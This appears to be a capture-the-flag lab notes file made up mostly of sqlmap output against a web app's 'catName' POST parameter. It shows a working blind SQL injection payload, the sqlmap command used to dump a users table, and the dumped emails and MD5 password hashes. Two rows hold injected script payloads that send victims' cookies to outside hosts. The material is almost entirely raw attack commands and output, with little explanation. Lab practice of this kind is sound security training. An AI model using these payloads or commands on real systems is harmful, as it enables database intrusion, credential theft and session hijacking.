|_ -| . [']     | .'| . |                                                      
|___|_  [.]_|_|_|__,|  _|                                                      
      |_|V...       |_|   https://sqlmap.org                                   

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:04:43 /2025-02-08/

[20:04:43] [INFO] parsing HTTP request from 'request'
[20:04:43] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catId=1&catName=test'||(SELECT 0x6b575974 WHERE 9070=9070 AND 3453=3453)||'
---
[20:04:44] [INFO] testing SQLite
[20:04:44] [INFO] confirming SQLite
[20:04:44] [INFO] actively fingerprinting SQLite
[20:04:44] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: SQLite
[20:04:44] [INFO] fetching tables for database: 'SQLite_masterdb'
[20:04:44] [INFO] fetching number of tables for database 'SQLite_masterdb'
[20:04:44] [INFO] retrieved: 4
[20:04:44] [INFO] retrieving the length of query output
[20:04:44] [INFO] retrieved: 13
[20:04:49] [INFO] retrieved: accepted_cats             
[20:04:49] [INFO] retrieving the length of query output
[20:04:49] [INFO] retrieved: 15
[20:04:55] [INFO] retrieved: sqlite_sequence             
[20:04:55] [INFO] retrieving the length of query output                        
[20:04:55] [INFO] retrieved: 4                                                 
[20:04:57] [INFO] retrieved: cats                                              
[20:04:57] [INFO] retrieving the length of query output                        
[20:04:57] [INFO] retrieved: 5                                                 
[20:04:59] [INFO] retrieved: users                                             
<current>                                                                      
[4 tables]                                                                     
+-----------------+                                                            
| accepted_cats   |                                                            
| cats            |                                                            
| sqlite_sequence |
| users           |
+-----------------+
```

DUMP
```bash
$ sqlmap -r request -p catName --level=5 --risk=3 --dbms=sqlite --dump -T users --threads 10

Table: users
[12 entries]
+---------+-------------------------------+----------------------------------+------------------------------------------------------------------------------------+
| user_id | email                         | password                         | username                                                                           |
+---------+-------------------------------+----------------------------------+------------------------------------------------------------------------------------+
| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f | axel                                                                               |
| 2       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c | rosa                                                                               |
| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad | robert                                                                             |
| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe | fabian                                                                             |
| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86 | jerryson                                                                           |
| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8 | larry                                                                              |
| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6   | royer                                                                              |
| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a | peter                                                                              |
| 9       | angel234g@gmail.com           | 24a8ec003ac2e1b3c5953a6f95f8f565 | angel                                                                              |
| 10      | jobert2020@gmail.com          | 88e4dceccd48820cf77b5cf6c08698ad | jobert                                                                             |
| 11      | 1234@1234                     | 81dc9bdb52d04dc20036dbd8313ed055 | <script>document.location='http://10.10.14.232:2323/?c='+document.cookie;</script> |                                                           
| 12      | lol@htb.com                   | 81dc9bdb52d04dc20036dbd8313ed055 | <script>document.location='http://10.10.14.160:1110/?c='+document.cookie;</script> |                                                           

```

![[Pasted image 20250210152417.png]]]]